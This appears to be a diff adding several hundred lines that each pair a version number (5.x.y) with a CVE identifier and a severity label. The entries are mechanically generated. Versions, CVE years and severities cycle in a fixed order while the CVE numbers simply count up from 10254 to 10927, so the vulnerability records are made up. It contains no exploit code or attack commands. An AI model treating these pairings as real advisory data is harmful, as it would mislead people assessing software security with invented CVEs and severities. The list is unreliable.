+5.14.4|CVE-2024-10254|severity:high
+5.0.5|CVE-2020-10255|severity:crit
+5.1.6|CVE-2021-10256|severity:low
+5.2.7|CVE-2022-10257|severity:med
+5.3.8|CVE-2023-10258|severity:high
+5.4.9|CVE-2024-10259|severity:crit
+5.5.0|CVE-2020-10260|severity:low
+5.6.1|CVE-2021-10261|severity:med
+5.7.2|CVE-2022-10262|severity:high
+5.8.3|CVE-2023-10263|severity:crit
+5.9.4|CVE-2024-10264|severity:low
+5.10.5|CVE-2020-10265|severity:med
+5.11.6|CVE-2021-10266|severity:high
+5.12.7|CVE-2022-10267|severity:crit
+5.13.8|CVE-2023-10268|severity:low
+5.14.9|CVE-2024-10269|severity:med
+5.0.0|CVE-2020-10270|severity:high
+5.1.1|CVE-2021-10271|severity:crit
+5.2.2|CVE-2022-10272|severity:low
+5.3.3|CVE-2023-10273|severity:med
+5.4.4|CVE-2024-10274|severity:high
+5.5.5|CVE-2020-10275|severity:crit
+5.6.6|CVE-2021-10276|severity:low
+5.7.7|CVE-2022-10277|severity:med
+5.8.8|CVE-2023-10278|severity:high
+5.9.9|CVE-2024-10279|severity:crit
+5.10.0|CVE-2020-10280|severity:low
+5.11.1|CVE-2021-10281|severity:med
+5.12.2|CVE-2022-10282|severity:high
+5.13.3|CVE-2023-10283|severity:crit
+5.14.4|CVE-2024-10284|severity:low
+5.0.5|CVE-2020-10285|severity:med
+5.1.6|CVE-2021-10286|severity:high
+5.2.7|CVE-2022-10287|severity:crit
+5.3.8|CVE-2023-10288|severity:low
+5.4.9|CVE-2024-10289|severity:med
+5.5.0|CVE-2020-10290|severity:high
+5.6.1|CVE-2021-10291|severity:crit
+5.7.2|CVE-2022-10292|severity:low
+5.8.3|CVE-2023-10293|severity:med
+5.9.4|CVE-2024-10294|severity:high
+5.10.5|CVE-2020-10295|severity:crit
+5.11.6|CVE-2021-10296|severity:low
+5.12.7|CVE-2022-10297|severity:med
+5.13.8|CVE-2023-10298|severity:high
+5.14.9|CVE-2024-10299|severity:crit
+5.0.0|CVE-2020-10300|severity:low
+5.1.1|CVE-2021-10301|severity:med
+5.2.2|CVE-2022-10302|severity:high
+5.3.3|CVE-2023-10303|severity:crit
+5.4.4|CVE-2024-10304|severity:low
+5.5.5|CVE-2020-10305|severity:med
+5.6.6|CVE-2021-10306|severity:high
+5.7.7|CVE-2022-10307|severity:crit
+5.8.8|CVE-2023-10308|severity:low
+5.9.9|CVE-2024-10309|severity:med
+5.10.0|CVE-2020-10310|severity:high
+5.11.1|CVE-2021-10311|severity:crit
+5.12.2|CVE-2022-10312|severity:low
+5.13.3|CVE-2023-10313|severity:med
+5.14.4|CVE-2024-10314|severity:high
+5.0.5|CVE-2020-10315|severity:crit
+5.1.6|CVE-2021-10316|severity:low
+5.2.7|CVE-2022-10317|severity:med
+5.3.8|CVE-2023-10318|severity:high
+5.4.9|CVE-2024-10319|severity:crit
+5.5.0|CVE-2020-10320|severity:low
+5.6.1|CVE-2021-10321|severity:med
+5.7.2|CVE-2022-10322|severity:high
+5.8.3|CVE-2023-10323|severity:crit
+5.9.4|CVE-2024-10324|severity:low
+5.10.5|CVE-2020-10325|severity:med
+5.11.6|CVE-2021-10326|severity:high
+5.12.7|CVE-2022-10327|severity:crit
+5.13.8|CVE-2023-10328|severity:low
+5.14.9|CVE-2024-10329|severity:med
+5.0.0|CVE-2020-10330|severity:high
+5.1.1|CVE-2021-10331|severity:crit
+5.2.2|CVE-2022-10332|severity:low
+5.3.3|CVE-2023-10333|severity:med
+5.4.4|CVE-2024-10334|severity:high
+5.5.5|CVE-2020-10335|severity:crit
+5.6.6|CVE-2021-10336|severity:low
+5.7.7|CVE-2022-10337|severity:med
+5.8.8|CVE-2023-10338|severity:high
+5.9.9|CVE-2024-10339|severity:crit
+5.10.0|CVE-2020-10340|severity:low
+5.11.1|CVE-2021-10341|severity:med
+5.12.2|CVE-2022-10342|severity:high
+5.13.3|CVE-2023-10343|severity:crit
+5.14.4|CVE-2024-10344|severity:low
+5.0.5|CVE-2020-10345|severity:med
+5.1.6|CVE-2021-10346|severity:high
+5.2.7|CVE-2022-10347|severity:crit
+5.3.8|CVE-2023-10348|severity:low
+5.4.9|CVE-2024-10349|severity:med
+5.5.0|CVE-2020-10350|severity:high
+5.6.1|CVE-2021-10351|severity:crit
+5.7.2|CVE-2022-10352|severity:low
+5.8.3|CVE-2023-10353|severity:med
+5.9.4|CVE-2024-10354|severity:high
+5.10.5|CVE-2020-10355|severity:crit
+5.11.6|CVE-2021-10356|severity:low
+5.12.7|CVE-2022-10357|severity:med
+5.13.8|CVE-2023-10358|severity:high
+5.14.9|CVE-2024-10359|severity:crit
+5.0.0|CVE-2020-10360|severity:low
+5.1.1|CVE-2021-10361|severity:med
+5.2.2|CVE-2022-10362|severity:high
+5.3.3|CVE-2023-10363|severity:crit
+5.4.4|CVE-2024-10364|severity:low
+5.5.5|CVE-2020-10365|severity:med
+5.6.6|CVE-2021-10366|severity:high
+5.7.7|CVE-2022-10367|severity:crit
+5.8.8|CVE-2023-10368|severity:low
+5.9.9|CVE-2024-10369|severity:med
+5.10.0|CVE-2020-10370|severity:high
+5.11.1|CVE-2021-10371|severity:crit
+5.12.2|CVE-2022-10372|severity:low
+5.13.3|CVE-2023-10373|severity:med
+5.14.4|CVE-2024-10374|severity:high
+5.0.5|CVE-2020-10375|severity:crit
+5.1.6|CVE-2021-10376|severity:low
+5.2.7|CVE-2022-10377|severity:med
+5.3.8|CVE-2023-10378|severity:high
+5.4.9|CVE-2024-10379|severity:crit
+5.5.0|CVE-2020-10380|severity:low
+5.6.1|CVE-2021-10381|severity:med
+5.7.2|CVE-2022-10382|severity:high
+5.8.3|CVE-2023-10383|severity:crit
+5.9.4|CVE-2024-10384|severity:low
+5.10.5|CVE-2020-10385|severity:med
+5.11.6|CVE-2021-10386|severity:high
+5.12.7|CVE-2022-10387|severity:crit
+5.13.8|CVE-2023-10388|severity:low
+5.14.9|CVE-2024-10389|severity:med
+5.0.0|CVE-2020-10390|severity:high
+5.1.1|CVE-2021-10391|severity:crit
+5.2.2|CVE-2022-10392|severity:low
+5.3.3|CVE-2023-10393|severity:med
+5.4.4|CVE-2024-10394|severity:high
+5.5.5|CVE-2020-10395|severity:crit
+5.6.6|CVE-2021-10396|severity:low
+5.7.7|CVE-2022-10397|severity:med
+5.8.8|CVE-2023-10398|severity:high
+5.9.9|CVE-2024-10399|severity:crit
+5.10.0|CVE-2020-10400|severity:low
+5.11.1|CVE-2021-10401|severity:med
+5.12.2|CVE-2022-10402|severity:high
+5.13.3|CVE-2023-10403|severity:crit
+5.14.4|CVE-2024-10404|severity:low
+5.0.5|CVE-2020-10405|severity:med
+5.1.6|CVE-2021-10406|severity:high
+5.2.7|CVE-2022-10407|severity:crit
+5.3.8|CVE-2023-10408|severity:low
+5.4.9|CVE-2024-10409|severity:med
+5.5.0|CVE-2020-10410|severity:high
+5.6.1|CVE-2021-10411|severity:crit
+5.7.2|CVE-2022-10412|severity:low
+5.8.3|CVE-2023-10413|severity:med
+5.9.4|CVE-2024-10414|severity:high
+5.10.5|CVE-2020-10415|severity:crit
+5.11.6|CVE-2021-10416|severity:low
+5.12.7|CVE-2022-10417|severity:med
+5.13.8|CVE-2023-10418|severity:high
+5.14.9|CVE-2024-10419|severity:crit
+5.0.0|CVE-2020-10420|severity:low
+5.1.1|CVE-2021-10421|severity:med
+5.2.2|CVE-2022-10422|severity:high
+5.3.3|CVE-2023-10423|severity:crit
+5.4.4|CVE-2024-10424|severity:low
+5.5.5|CVE-2020-10425|severity:med
+5.6.6|CVE-2021-10426|severity:high
+5.7.7|CVE-2022-10427|severity:crit
+5.8.8|CVE-2023-10428|severity:low
+5.9.9|CVE-2024-10429|severity:med
+5.10.0|CVE-2020-10430|severity:high
+5.11.1|CVE-2021-10431|severity:crit
+5.12.2|CVE-2022-10432|severity:low
+5.13.3|CVE-2023-10433|severity:med
+5.14.4|CVE-2024-10434|severity:high
+5.0.5|CVE-2020-10435|severity:crit
+5.1.6|CVE-2021-10436|severity:low
+5.2.7|CVE-2022-10437|severity:med
+5.3.8|CVE-2023-10438|severity:high
+5.4.9|CVE-2024-10439|severity:crit
+5.5.0|CVE-2020-10440|severity:low
+5.6.1|CVE-2021-10441|severity:med
+5.7.2|CVE-2022-10442|severity:high
+5.8.3|CVE-2023-10443|severity:crit
+5.9.4|CVE-2024-10444|severity:low
+5.10.5|CVE-2020-10445|severity:med
+5.11.6|CVE-2021-10446|severity:high
+5.12.7|CVE-2022-10447|severity:crit
+5.13.8|CVE-2023-10448|severity:low
+5.14.9|CVE-2024-10449|severity:med
+5.0.0|CVE-2020-10450|severity:high
+5.1.1|CVE-2021-10451|severity:crit
+5.2.2|CVE-2022-10452|severity:low
+5.3.3|CVE-2023-10453|severity:med
+5.4.4|CVE-2024-10454|severity:high
+5.5.5|CVE-2020-10455|severity:crit
+5.6.6|CVE-2021-10456|severity:low
+5.7.7|CVE-2022-10457|severity:med
+5.8.8|CVE-2023-10458|severity:high
+5.9.9|CVE-2024-10459|severity:crit
+5.10.0|CVE-2020-10460|severity:low
+5.11.1|CVE-2021-10461|severity:med
+5.12.2|CVE-2022-10462|severity:high
+5.13.3|CVE-2023-10463|severity:crit
+5.14.4|CVE-2024-10464|severity:low
+5.0.5|CVE-2020-10465|severity:med
+5.1.6|CVE-2021-10466|severity:high
+5.2.7|CVE-2022-10467|severity:crit
+5.3.8|CVE-2023-10468|severity:low
+5.4.9|CVE-2024-10469|severity:med
+5.5.0|CVE-2020-10470|severity:high
+5.6.1|CVE-2021-10471|severity:crit
+5.7.2|CVE-2022-10472|severity:low
+5.8.3|CVE-2023-10473|severity:med
+5.9.4|CVE-2024-10474|severity:high
+5.10.5|CVE-2020-10475|severity:crit
+5.11.6|CVE-2021-10476|severity:low
+5.12.7|CVE-2022-10477|severity:med
+5.13.8|CVE-2023-10478|severity:high
+5.14.9|CVE-2024-10479|severity:crit
+5.0.0|CVE-2020-10480|severity:low
+5.1.1|CVE-2021-10481|severity:med
+5.2.2|CVE-2022-10482|severity:high
+5.3.3|CVE-2023-10483|severity:crit
+5.4.4|CVE-2024-10484|severity:low
+5.5.5|CVE-2020-10485|severity:med
+5.6.6|CVE-2021-10486|severity:high
+5.7.7|CVE-2022-10487|severity:crit
+5.8.8|CVE-2023-10488|severity:low
+5.9.9|CVE-2024-10489|severity:med
+5.10.0|CVE-2020-10490|severity:high
+5.11.1|CVE-2021-10491|severity:crit
+5.12.2|CVE-2022-10492|severity:low
+5.13.3|CVE-2023-10493|severity:med
+5.14.4|CVE-2024-10494|severity:high
+5.0.5|CVE-2020-10495|severity:crit
+5.1.6|CVE-2021-10496|severity:low
+5.2.7|CVE-2022-10497|severity:med
+5.3.8|CVE-2023-10498|severity:high
+5.4.9|CVE-2024-10499|severity:crit
+5.5.0|CVE-2020-10500|severity:low
+5.6.1|CVE-2021-10501|severity:med
+5.7.2|CVE-2022-10502|severity:high
+5.8.3|CVE-2023-10503|severity:crit
+5.9.4|CVE-2024-10504|severity:low
+5.10.5|CVE-2020-10505|severity:med
+5.11.6|CVE-2021-10506|severity:high
+5.12.7|CVE-2022-10507|severity:crit
+5.13.8|CVE-2023-10508|severity:low
+5.14.9|CVE-2024-10509|severity:med
+5.0.0|CVE-2020-10510|severity:high
+5.1.1|CVE-2021-10511|severity:crit
+5.2.2|CVE-2022-10512|severity:low
+5.3.3|CVE-2023-10513|severity:med
+5.4.4|CVE-2024-10514|severity:high
+5.5.5|CVE-2020-10515|severity:crit
+5.6.6|CVE-2021-10516|severity:low
+5.7.7|CVE-2022-10517|severity:med
+5.8.8|CVE-2023-10518|severity:high
+5.9.9|CVE-2024-10519|severity:crit
+5.10.0|CVE-2020-10520|severity:low
+5.11.1|CVE-2021-10521|severity:med
+5.12.2|CVE-2022-10522|severity:high
+5.13.3|CVE-2023-10523|severity:crit
+5.14.4|CVE-2024-10524|severity:low
+5.0.5|CVE-2020-10525|severity:med
+5.1.6|CVE-2021-10526|severity:high
+5.2.7|CVE-2022-10527|severity:crit
+5.3.8|CVE-2023-10528|severity:low
+5.4.9|CVE-2024-10529|severity:med
+5.5.0|CVE-2020-10530|severity:high
+5.6.1|CVE-2021-10531|severity:crit
+5.7.2|CVE-2022-10532|severity:low
+5.8.3|CVE-2023-10533|severity:med
+5.9.4|CVE-2024-10534|severity:high
+5.10.5|CVE-2020-10535|severity:crit
+5.11.6|CVE-2021-10536|severity:low
+5.12.7|CVE-2022-10537|severity:med
+5.13.8|CVE-2023-10538|severity:high
+5.14.9|CVE-2024-10539|severity:crit
+5.0.0|CVE-2020-10540|severity:low
+5.1.1|CVE-2021-10541|severity:med
+5.2.2|CVE-2022-10542|severity:high
+5.3.3|CVE-2023-10543|severity:crit
+5.4.4|CVE-2024-10544|severity:low
+5.5.5|CVE-2020-10545|severity:med
+5.6.6|CVE-2021-10546|severity:high
+5.7.7|CVE-2022-10547|severity:crit
+5.8.8|CVE-2023-10548|severity:low
+5.9.9|CVE-2024-10549|severity:med
+5.10.0|CVE-2020-10550|severity:high
+5.11.1|CVE-2021-10551|severity:crit
+5.12.2|CVE-2022-10552|severity:low
+5.13.3|CVE-2023-10553|severity:med
+5.14.4|CVE-2024-10554|severity:high
+5.0.5|CVE-2020-10555|severity:crit
+5.1.6|CVE-2021-10556|severity:low
+5.2.7|CVE-2022-10557|severity:med
+5.3.8|CVE-2023-10558|severity:high
+5.4.9|CVE-2024-10559|severity:crit
+5.5.0|CVE-2020-10560|severity:low
+5.6.1|CVE-2021-10561|severity:med
+5.7.2|CVE-2022-10562|severity:high
+5.8.3|CVE-2023-10563|severity:crit
+5.9.4|CVE-2024-10564|severity:low
+5.10.5|CVE-2020-10565|severity:med
+5.11.6|CVE-2021-10566|severity:high
+5.12.7|CVE-2022-10567|severity:crit
+5.13.8|CVE-2023-10568|severity:low
+5.14.9|CVE-2024-10569|severity:med
+5.0.0|CVE-2020-10570|severity:high
+5.1.1|CVE-2021-10571|severity:crit
+5.2.2|CVE-2022-10572|severity:low
+5.3.3|CVE-2023-10573|severity:med
+5.4.4|CVE-2024-10574|severity:high
+5.5.5|CVE-2020-10575|severity:crit
+5.6.6|CVE-2021-10576|severity:low
+5.7.7|CVE-2022-10577|severity:med
+5.8.8|CVE-2023-10578|severity:high
+5.9.9|CVE-2024-10579|severity:crit
+5.10.0|CVE-2020-10580|severity:low
+5.11.1|CVE-2021-10581|severity:med
+5.12.2|CVE-2022-10582|severity:high
+5.13.3|CVE-2023-10583|severity:crit
+5.14.4|CVE-2024-10584|severity:low
+5.0.5|CVE-2020-10585|severity:med
+5.1.6|CVE-2021-10586|severity:high
+5.2.7|CVE-2022-10587|severity:crit
+5.3.8|CVE-2023-10588|severity:low
+5.4.9|CVE-2024-10589|severity:med
+5.5.0|CVE-2020-10590|severity:high
+5.6.1|CVE-2021-10591|severity:crit
+5.7.2|CVE-2022-10592|severity:low
+5.8.3|CVE-2023-10593|severity:med
+5.9.4|CVE-2024-10594|severity:high
+5.10.5|CVE-2020-10595|severity:crit
+5.11.6|CVE-2021-10596|severity:low
+5.12.7|CVE-2022-10597|severity:med
+5.13.8|CVE-2023-10598|severity:high
+5.14.9|CVE-2024-10599|severity:crit
+5.0.0|CVE-2020-10600|severity:low
+5.1.1|CVE-2021-10601|severity:med
+5.2.2|CVE-2022-10602|severity:high
+5.3.3|CVE-2023-10603|severity:crit
+5.4.4|CVE-2024-10604|severity:low
+5.5.5|CVE-2020-10605|severity:med
+5.6.6|CVE-2021-10606|severity:high
+5.7.7|CVE-2022-10607|severity:crit
+5.8.8|CVE-2023-10608|severity:low
+5.9.9|CVE-2024-10609|severity:med
+5.10.0|CVE-2020-10610|severity:high
+5.11.1|CVE-2021-10611|severity:crit
+5.12.2|CVE-2022-10612|severity:low
+5.13.3|CVE-2023-10613|severity:med
+5.14.4|CVE-2024-10614|severity:high
+5.0.5|CVE-2020-10615|severity:crit
+5.1.6|CVE-2021-10616|severity:low
+5.2.7|CVE-2022-10617|severity:med
+5.3.8|CVE-2023-10618|severity:high
+5.4.9|CVE-2024-10619|severity:crit
+5.5.0|CVE-2020-10620|severity:low
+5.6.1|CVE-2021-10621|severity:med
+5.7.2|CVE-2022-10622|severity:high
+5.8.3|CVE-2023-10623|severity:crit
+5.9.4|CVE-2024-10624|severity:low
+5.10.5|CVE-2020-10625|severity:med
+5.11.6|CVE-2021-10626|severity:high
+5.12.7|CVE-2022-10627|severity:crit
+5.13.8|CVE-2023-10628|severity:low
+5.14.9|CVE-2024-10629|severity:med
+5.0.0|CVE-2020-10630|severity:high
+5.1.1|CVE-2021-10631|severity:crit
+5.2.2|CVE-2022-10632|severity:low
+5.3.3|CVE-2023-10633|severity:med
+5.4.4|CVE-2024-10634|severity:high
+5.5.5|CVE-2020-10635|severity:crit
+5.6.6|CVE-2021-10636|severity:low
+5.7.7|CVE-2022-10637|severity:med
+5.8.8|CVE-2023-10638|severity:high
+5.9.9|CVE-2024-10639|severity:crit
+5.10.0|CVE-2020-10640|severity:low
+5.11.1|CVE-2021-10641|severity:med
+5.12.2|CVE-2022-10642|severity:high
+5.13.3|CVE-2023-10643|severity:crit
+5.14.4|CVE-2024-10644|severity:low
+5.0.5|CVE-2020-10645|severity:med
+5.1.6|CVE-2021-10646|severity:high
+5.2.7|CVE-2022-10647|severity:crit
+5.3.8|CVE-2023-10648|severity:low
+5.4.9|CVE-2024-10649|severity:med
+5.5.0|CVE-2020-10650|severity:high
+5.6.1|CVE-2021-10651|severity:crit
+5.7.2|CVE-2022-10652|severity:low
+5.8.3|CVE-2023-10653|severity:med
+5.9.4|CVE-2024-10654|severity:high
+5.10.5|CVE-2020-10655|severity:crit
+5.11.6|CVE-2021-10656|severity:low
+5.12.7|CVE-2022-10657|severity:med
+5.13.8|CVE-2023-10658|severity:high
+5.14.9|CVE-2024-10659|severity:crit
+5.0.0|CVE-2020-10660|severity:low
+5.1.1|CVE-2021-10661|severity:med
+5.2.2|CVE-2022-10662|severity:high
+5.3.3|CVE-2023-10663|severity:crit
+5.4.4|CVE-2024-10664|severity:low
+5.5.5|CVE-2020-10665|severity:med
+5.6.6|CVE-2021-10666|severity:high
+5.7.7|CVE-2022-10667|severity:crit
+5.8.8|CVE-2023-10668|severity:low
+5.9.9|CVE-2024-10669|severity:med
+5.10.0|CVE-2020-10670|severity:high
+5.11.1|CVE-2021-10671|severity:crit
+5.12.2|CVE-2022-10672|severity:low
+5.13.3|CVE-2023-10673|severity:med
+5.14.4|CVE-2024-10674|severity:high
+5.0.5|CVE-2020-10675|severity:crit
+5.1.6|CVE-2021-10676|severity:low
+5.2.7|CVE-2022-10677|severity:med
+5.3.8|CVE-2023-10678|severity:high
+5.4.9|CVE-2024-10679|severity:crit
+5.5.0|CVE-2020-10680|severity:low
+5.6.1|CVE-2021-10681|severity:med
+5.7.2|CVE-2022-10682|severity:high
+5.8.3|CVE-2023-10683|severity:crit
+5.9.4|CVE-2024-10684|severity:low
+5.10.5|CVE-2020-10685|severity:med
+5.11.6|CVE-2021-10686|severity:high
+5.12.7|CVE-2022-10687|severity:crit
+5.13.8|CVE-2023-10688|severity:low
+5.14.9|CVE-2024-10689|severity:med
+5.0.0|CVE-2020-10690|severity:high
+5.1.1|CVE-2021-10691|severity:crit
+5.2.2|CVE-2022-10692|severity:low
+5.3.3|CVE-2023-10693|severity:med
+5.4.4|CVE-2024-10694|severity:high
+5.5.5|CVE-2020-10695|severity:crit
+5.6.6|CVE-2021-10696|severity:low
+5.7.7|CVE-2022-10697|severity:med
+5.8.8|CVE-2023-10698|severity:high
+5.9.9|CVE-2024-10699|severity:crit
+5.10.0|CVE-2020-10700|severity:low
+5.11.1|CVE-2021-10701|severity:med
+5.12.2|CVE-2022-10702|severity:high
+5.13.3|CVE-2023-10703|severity:crit
+5.14.4|CVE-2024-10704|severity:low
+5.0.5|CVE-2020-10705|severity:med
+5.1.6|CVE-2021-10706|severity:high
+5.2.7|CVE-2022-10707|severity:crit
+5.3.8|CVE-2023-10708|severity:low
+5.4.9|CVE-2024-10709|severity:med
+5.5.0|CVE-2020-10710|severity:high
+5.6.1|CVE-2021-10711|severity:crit
+5.7.2|CVE-2022-10712|severity:low
+5.8.3|CVE-2023-10713|severity:med
+5.9.4|CVE-2024-10714|severity:high
+5.10.5|CVE-2020-10715|severity:crit
+5.11.6|CVE-2021-10716|severity:low
+5.12.7|CVE-2022-10717|severity:med
+5.13.8|CVE-2023-10718|severity:high
+5.14.9|CVE-2024-10719|severity:crit
+5.0.0|CVE-2020-10720|severity:low
+5.1.1|CVE-2021-10721|severity:med
+5.2.2|CVE-2022-10722|severity:high
+5.3.3|CVE-2023-10723|severity:crit
+5.4.4|CVE-2024-10724|severity:low
+5.5.5|CVE-2020-10725|severity:med
+5.6.6|CVE-2021-10726|severity:high
+5.7.7|CVE-2022-10727|severity:crit
+5.8.8|CVE-2023-10728|severity:low
+5.9.9|CVE-2024-10729|severity:med
+5.10.0|CVE-2020-10730|severity:high
+5.11.1|CVE-2021-10731|severity:crit
+5.12.2|CVE-2022-10732|severity:low
+5.13.3|CVE-2023-10733|severity:med
+5.14.4|CVE-2024-10734|severity:high
+5.0.5|CVE-2020-10735|severity:crit
+5.1.6|CVE-2021-10736|severity:low
+5.2.7|CVE-2022-10737|severity:med
+5.3.8|CVE-2023-10738|severity:high
+5.4.9|CVE-2024-10739|severity:crit
+5.5.0|CVE-2020-10740|severity:low
+5.6.1|CVE-2021-10741|severity:med
+5.7.2|CVE-2022-10742|severity:high
+5.8.3|CVE-2023-10743|severity:crit
+5.9.4|CVE-2024-10744|severity:low
+5.10.5|CVE-2020-10745|severity:med
+5.11.6|CVE-2021-10746|severity:high
+5.12.7|CVE-2022-10747|severity:crit
+5.13.8|CVE-2023-10748|severity:low
+5.14.9|CVE-2024-10749|severity:med
+5.0.0|CVE-2020-10750|severity:high
+5.1.1|CVE-2021-10751|severity:crit
+5.2.2|CVE-2022-10752|severity:low
+5.3.3|CVE-2023-10753|severity:med
+5.4.4|CVE-2024-10754|severity:high
+5.5.5|CVE-2020-10755|severity:crit
+5.6.6|CVE-2021-10756|severity:low
+5.7.7|CVE-2022-10757|severity:med
+5.8.8|CVE-2023-10758|severity:high
+5.9.9|CVE-2024-10759|severity:crit
+5.10.0|CVE-2020-10760|severity:low
+5.11.1|CVE-2021-10761|severity:med
+5.12.2|CVE-2022-10762|severity:high
+5.13.3|CVE-2023-10763|severity:crit
+5.14.4|CVE-2024-10764|severity:low
+5.0.5|CVE-2020-10765|severity:med
+5.1.6|CVE-2021-10766|severity:high
+5.2.7|CVE-2022-10767|severity:crit
+5.3.8|CVE-2023-10768|severity:low
+5.4.9|CVE-2024-10769|severity:med
+5.5.0|CVE-2020-10770|severity:high
+5.6.1|CVE-2021-10771|severity:crit
+5.7.2|CVE-2022-10772|severity:low
+5.8.3|CVE-2023-10773|severity:med
+5.9.4|CVE-2024-10774|severity:high
+5.10.5|CVE-2020-10775|severity:crit
+5.11.6|CVE-2021-10776|severity:low
+5.12.7|CVE-2022-10777|severity:med
+5.13.8|CVE-2023-10778|severity:high
+5.14.9|CVE-2024-10779|severity:crit
+5.0.0|CVE-2020-10780|severity:low
+5.1.1|CVE-2021-10781|severity:med
+5.2.2|CVE-2022-10782|severity:high
+5.3.3|CVE-2023-10783|severity:crit
+5.4.4|CVE-2024-10784|severity:low
+5.5.5|CVE-2020-10785|severity:med
+5.6.6|CVE-2021-10786|severity:high
+5.7.7|CVE-2022-10787|severity:crit
+5.8.8|CVE-2023-10788|severity:low
+5.9.9|CVE-2024-10789|severity:med
+5.10.0|CVE-2020-10790|severity:high
+5.11.1|CVE-2021-10791|severity:crit
+5.12.2|CVE-2022-10792|severity:low
+5.13.3|CVE-2023-10793|severity:med
+5.14.4|CVE-2024-10794|severity:high
+5.0.5|CVE-2020-10795|severity:crit
+5.1.6|CVE-2021-10796|severity:low
+5.2.7|CVE-2022-10797|severity:med
+5.3.8|CVE-2023-10798|severity:high
+5.4.9|CVE-2024-10799|severity:crit
+5.5.0|CVE-2020-10800|severity:low
+5.6.1|CVE-2021-10801|severity:med
+5.7.2|CVE-2022-10802|severity:high
+5.8.3|CVE-2023-10803|severity:crit
+5.9.4|CVE-2024-10804|severity:low
+5.10.5|CVE-2020-10805|severity:med
+5.11.6|CVE-2021-10806|severity:high
+5.12.7|CVE-2022-10807|severity:crit
+5.13.8|CVE-2023-10808|severity:low
+5.14.9|CVE-2024-10809|severity:med
+5.0.0|CVE-2020-10810|severity:high
+5.1.1|CVE-2021-10811|severity:crit
+5.2.2|CVE-2022-10812|severity:low
+5.3.3|CVE-2023-10813|severity:med
+5.4.4|CVE-2024-10814|severity:high
+5.5.5|CVE-2020-10815|severity:crit
+5.6.6|CVE-2021-10816|severity:low
+5.7.7|CVE-2022-10817|severity:med
+5.8.8|CVE-2023-10818|severity:high
+5.9.9|CVE-2024-10819|severity:crit
+5.10.0|CVE-2020-10820|severity:low
+5.11.1|CVE-2021-10821|severity:med
+5.12.2|CVE-2022-10822|severity:high
+5.13.3|CVE-2023-10823|severity:crit
+5.14.4|CVE-2024-10824|severity:low
+5.0.5|CVE-2020-10825|severity:med
+5.1.6|CVE-2021-10826|severity:high
+5.2.7|CVE-2022-10827|severity:crit
+5.3.8|CVE-2023-10828|severity:low
+5.4.9|CVE-2024-10829|severity:med
+5.5.0|CVE-2020-10830|severity:high
+5.6.1|CVE-2021-10831|severity:crit
+5.7.2|CVE-2022-10832|severity:low
+5.8.3|CVE-2023-10833|severity:med
+5.9.4|CVE-2024-10834|severity:high
+5.10.5|CVE-2020-10835|severity:crit
+5.11.6|CVE-2021-10836|severity:low
+5.12.7|CVE-2022-10837|severity:med
+5.13.8|CVE-2023-10838|severity:high
+5.14.9|CVE-2024-10839|severity:crit
+5.0.0|CVE-2020-10840|severity:low
+5.1.1|CVE-2021-10841|severity:med
+5.2.2|CVE-2022-10842|severity:high
+5.3.3|CVE-2023-10843|severity:crit
+5.4.4|CVE-2024-10844|severity:low
+5.5.5|CVE-2020-10845|severity:med
+5.6.6|CVE-2021-10846|severity:high
+5.7.7|CVE-2022-10847|severity:crit
+5.8.8|CVE-2023-10848|severity:low
+5.9.9|CVE-2024-10849|severity:med
+5.10.0|CVE-2020-10850|severity:high
+5.11.1|CVE-2021-10851|severity:crit
+5.12.2|CVE-2022-10852|severity:low
+5.13.3|CVE-2023-10853|severity:med
+5.14.4|CVE-2024-10854|severity:high
+5.0.5|CVE-2020-10855|severity:crit
+5.1.6|CVE-2021-10856|severity:low
+5.2.7|CVE-2022-10857|severity:med
+5.3.8|CVE-2023-10858|severity:high
+5.4.9|CVE-2024-10859|severity:crit
+5.5.0|CVE-2020-10860|severity:low
+5.6.1|CVE-2021-10861|severity:med
+5.7.2|CVE-2022-10862|severity:high
+5.8.3|CVE-2023-10863|severity:crit
+5.9.4|CVE-2024-10864|severity:low
+5.10.5|CVE-2020-10865|severity:med
+5.11.6|CVE-2021-10866|severity:high
+5.12.7|CVE-2022-10867|severity:crit
+5.13.8|CVE-2023-10868|severity:low
+5.14.9|CVE-2024-10869|severity:med
+5.0.0|CVE-2020-10870|severity:high
+5.1.1|CVE-2021-10871|severity:crit
+5.2.2|CVE-2022-10872|severity:low
+5.3.3|CVE-2023-10873|severity:med
+5.4.4|CVE-2024-10874|severity:high
+5.5.5|CVE-2020-10875|severity:crit
+5.6.6|CVE-2021-10876|severity:low
+5.7.7|CVE-2022-10877|severity:med
+5.8.8|CVE-2023-10878|severity:high
+5.9.9|CVE-2024-10879|severity:crit
+5.10.0|CVE-2020-10880|severity:low
+5.11.1|CVE-2021-10881|severity:med
+5.12.2|CVE-2022-10882|severity:high
+5.13.3|CVE-2023-10883|severity:crit
+5.14.4|CVE-2024-10884|severity:low
+5.0.5|CVE-2020-10885|severity:med
+5.1.6|CVE-2021-10886|severity:high
+5.2.7|CVE-2022-10887|severity:crit
+5.3.8|CVE-2023-10888|severity:low
+5.4.9|CVE-2024-10889|severity:med
+5.5.0|CVE-2020-10890|severity:high
+5.6.1|CVE-2021-10891|severity:crit
+5.7.2|CVE-2022-10892|severity:low
+5.8.3|CVE-2023-10893|severity:med
+5.9.4|CVE-2024-10894|severity:high
+5.10.5|CVE-2020-10895|severity:crit
+5.11.6|CVE-2021-10896|severity:low
+5.12.7|CVE-2022-10897|severity:med
+5.13.8|CVE-2023-10898|severity:high
+5.14.9|CVE-2024-10899|severity:crit
+5.0.0|CVE-2020-10900|severity:low
+5.1.1|CVE-2021-10901|severity:med
+5.2.2|CVE-2022-10902|severity:high
+5.3.3|CVE-2023-10903|severity:crit
+5.4.4|CVE-2024-10904|severity:low
+5.5.5|CVE-2020-10905|severity:med
+5.6.6|CVE-2021-10906|severity:high
+5.7.7|CVE-2022-10907|severity:crit
+5.8.8|CVE-2023-10908|severity:low
+5.9.9|CVE-2024-10909|severity:med
+5.10.0|CVE-2020-10910|severity:high
+5.11.1|CVE-2021-10911|severity:crit
+5.12.2|CVE-2022-10912|severity:low
+5.13.3|CVE-2023-10913|severity:med
+5.14.4|CVE-2024-10914|severity:high
+5.0.5|CVE-2020-10915|severity:crit
+5.1.6|CVE-2021-10916|severity:low
+5.2.7|CVE-2022-10917|severity:med
+5.3.8|CVE-2023-10918|severity:high
+5.4.9|CVE-2024-10919|severity:crit
+5.5.0|CVE-2020-10920|severity:low
+5.6.1|CVE-2021-10921|severity:med
+5.7.2|CVE-2022-10922|severity:high
+5.8.3|CVE-2023-10923|severity:crit
+5.9.4|CVE-2024-10924|severity:low
+5.10.5|CVE-2020-10925|severity:med
+5.11.6|CVE-2021-10926|severity:high
+5.12.7|CVE-2022-10927|severity:crit
